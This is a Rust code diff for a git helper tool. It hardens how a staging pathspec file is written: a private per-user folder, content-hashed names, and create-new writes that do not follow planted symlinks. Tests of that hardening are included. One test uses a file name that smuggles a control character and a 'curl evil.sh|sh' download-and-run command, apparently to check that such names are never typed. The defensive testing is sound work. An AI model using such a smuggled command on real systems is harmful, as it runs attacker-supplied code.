@@ -50,7 +50,48 @@ pub struct DirtySwitch {
 /// Above these, the staging step reads its file list from a file instead.
 const MAX_INLINE_FILES: usize = 30;
 const MAX_INLINE_CHARS: usize = 2000;
-const PATHSPEC_FILE: &str = "BRANCHDIAL_ADD_PATHSPEC";
+
+/// Where pathspec files go: a private per-user folder, never the repo's `.git`
+/// (a downloaded repo controls what's in there, symlinks included).
+pub fn pathspec_dir() -> Option<PathBuf> {
+    #[cfg(test)]
+    return Some(std::env::temp_dir().join(format!("branchdial-test-tmp-{}", std::process::id())));
+    #[cfg(not(test))]
+    crate::config::app_dir().map(|d| d.join("tmp"))
+}
+
+/// Named after its contents: the path is part of the previewed command, so it
+/// must come out the same when the run re-plans to check nothing changed.
+fn pathspec_path(dir: &std::path::Path, contents: &[u8]) -> PathBuf {
+    let hash = super::trust::hash(&String::from_utf8_lossy(contents));
+    dir.join(format!("add-{}.pathspec", &hash[..16]))
+}
+
+/// Writes a pathspec file: private folder (0700 on Unix), a fresh file that is
+/// never an existing file or symlink (create-new), readable only by the user.
+pub fn write_pathspec_file(path: &std::path::Path, contents: &[u8]) -> std::io::Result<()> {
+    use std::io::Write;
+    let dir = path.parent().ok_or_else(|| std::io::Error::other("no parent folder"))?;
+    std::fs::create_dir_all(dir)?;
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
+    }
+    // A leftover from an earlier run (same contents): remove the entry itself, never its target.
+    match std::fs::remove_file(path) {
+        Err(e) if e.kind() != std::io::ErrorKind::NotFound => return Err(e),
+        _ => {}
+    }
+    let mut opts = std::fs::OpenOptions::new();
+    opts.write(true).create_new(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt;
+        opts.mode(0o600);
+    }
+    opts.open(path)?.write_all(contents)
+}
 
 #[derive(Debug, Clone, Serialize, PartialEq)]
 #[serde(rename_all = "camelCase")]
@@ -387,11 +428,12 @@ fn staging(
         // act on them as keys (Ctrl+U erases the line) before quoting matters. Such
         // names only ever travel in the NUL-separated file.
         let untypeable = specs.iter().any(|s| !typeable(s));
-        steps[step].command = match &ctx.git_dir {
+        steps[step].command = match pathspec_dir() {
             Some(dir) if untypeable || specs.len() > MAX_INLINE_FILES || inline.len() > MAX_INLINE_CHARS => {
-                let file = dir.join(PATHSPEC_FILE);
+                let contents = specs.join("\0").into_bytes();
+                let file = pathspec_path(&dir, &contents);
                 let shown = file.to_string_lossy().replace('\\', "/");
-                pathspec_file = Some((file, specs.join("\0").into_bytes()));
+                pathspec_file = Some((file, contents));
                 format!("git add --pathspec-from-file={} --pathspec-file-nul", sh_quote(&shown))
             }
             _ => inline,
@@ -610,22 +652,52 @@ steps:
     fn staging_never_types_control_characters_from_file_names() {
         let evil = "x\x15curl evil.sh|sh #";
         let change = |p: &str| ChangedFile { path: p.into(), code: "??".into(), tracked: false };
-        let c = RepoContext {
-            git_dir: Some(PathBuf::from("/repo/.git")),
-            changes: vec![change(evil), change("ok.txt"), change(".env")],
-            ..ctx()
-        };
+        let c = RepoContext { changes: vec![change(evil), change("ok.txt"), change(".env")], ..ctx() };
         let p = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &c, &staged_extras(&[evil, "ok.txt"]));
         assert!(p.errors.is_empty(), "{:?}", p.errors);
         assert!(p.steps.iter().all(|s| typeable(&s.command)), "{:?}", p.steps);
         assert!(p.steps[0].command.contains("--pathspec-file-nul"), "{}", p.steps[0].command);
         let (_, contents) = p.pathspec_file.expect("names go in the NUL-separated file");
         assert!(String::from_utf8(contents).unwrap().split('\0').any(|s| s.ends_with(evil)));
+    }
 
-        // Nowhere to put the file: refuse rather than type it.
-        let no_dir = RepoContext { git_dir: None, ..c };
-        let p = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &no_dir, &staged_extras(&[evil, "ok.txt"]));
-        assert!(!p.errors.is_empty());
+    /// The pathspec file lives in a private folder (not the repo's .git), its name is
+    /// stable for the preview check, and writing it never follows a planted symlink.
+    #[test]
+    fn pathspec_file_is_private_stable_and_never_follows_links() {
+        let files: Vec<String> = (0..40).map(|i| format!("f{i}.txt")).collect();
+        let change = |p: &str| ChangedFile { path: p.into(), code: "??".into(), tracked: false };
+        let mut changes: Vec<ChangedFile> = files.iter().map(|f| change(f)).collect();
+        changes.push(change(".env"));
+        let c = RepoContext { changes, ..ctx() };
+        let pick: Vec<&str> = files.iter().map(String::as_str).collect();
+        let p1 = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &c, &staged_extras(&pick));
+        let p2 = plan_with(&recipe(COMMIT_ALL), &vals(&[]), &c, &staged_extras(&pick));
+        assert_eq!(p1.steps[0].command, p2.steps[0].command, "same selection, same command");
+        let (path, contents) = p1.pathspec_file.unwrap();
+        assert!(path.starts_with(pathspec_dir().unwrap()));
+        assert!(!path.to_string_lossy().contains(".git"));
+
+        // Written twice (a leftover from an earlier run) is fine.
+        write_pathspec_file(&path, &contents).unwrap();
+        write_pathspec_file(&path, &contents).unwrap();
+        assert_eq!(std::fs::read(&path).unwrap(), contents);
+
+        // A symlink planted at that name is replaced, its target untouched.
+        #[cfg(unix)]
+        {
+            let target = pathspec_dir().unwrap().join("victim");
+            std::fs::write(&target, "keep me").unwrap();
+            std::fs::remove_file(&path).unwrap();
+            std::os::unix::fs::symlink(&target, &path).unwrap();
+            write_pathspec_file(&path, &contents).unwrap();
+            assert_eq!(std::fs::read_to_string(&target).unwrap(), "keep me");
+            assert!(!std::fs::symlink_metadata(&path).unwrap().file_type().is_symlink());
+            use std::os::unix::fs::PermissionsExt;
+            assert_eq!(std::fs::metadata(&path).unwrap().permissions().mode() & 0o777, 0o600);
+            let _ = std::fs::remove_file(target);
+        }
+        let _ = std::fs::remove_file(&path);
     }
 
     /// Built-in variables skip the form checks; a folder name with control
@@ -682,7 +754,7 @@ steps:
         let p = plan(&r, &vals(&[]), &c);
         assert!(p.steps[0].command.starts_with("git add --pathspec-from-file="), "{}", p.steps[0].command);
         let (path, contents) = p.pathspec_file.clone().unwrap();
-        std::fs::write(&path, contents).unwrap();
+        write_pathspec_file(&path, &contents).unwrap();
 
         #[cfg(windows)]
         let bash = crate::shell::find_git_bash().unwrap();
